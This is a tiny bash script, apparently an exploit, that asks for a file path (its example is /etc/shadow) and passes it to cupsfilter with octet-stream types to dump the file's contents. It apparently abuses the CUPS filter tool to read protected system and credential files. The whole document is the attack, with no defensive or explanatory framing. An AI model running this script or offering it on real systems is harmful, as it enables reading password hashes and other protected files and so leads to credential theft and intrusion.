#!/bin/bash
echo -n "[+] Enter file path(eg:- /etc/shadow): "
read filepath
cupsfilter -i application/octet-stream -m application/octet-stream $filepath
